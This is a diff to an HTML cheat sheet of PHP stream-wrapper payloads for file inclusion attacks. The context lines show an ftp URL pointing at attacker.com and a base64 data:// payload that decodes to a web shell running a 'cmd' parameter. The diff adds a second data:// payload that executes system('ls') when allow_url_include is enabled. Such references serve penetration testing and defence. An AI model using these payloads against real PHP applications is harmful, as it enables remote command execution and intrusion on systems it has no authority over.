@@ -83,6 +83,8 @@ ftp://user:pass@attacker.com/evil.txt</code></pre>
                     <ul>
                        <p>Inline payloads - RCE if allow_url_include=On   (/etc/php/X.Y/fpm/php.ini)</p>
                        <pre><code class="language-php">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id</code></pre> 
+                       <p>Another example URL encoded</p>
+                       <pre><code class="language-php">data://text/plain,<?php%20echo%20system('ls');?>"</code></pre> 
                     </ul>
                 <h3>glob://</h3>
                     <ul>
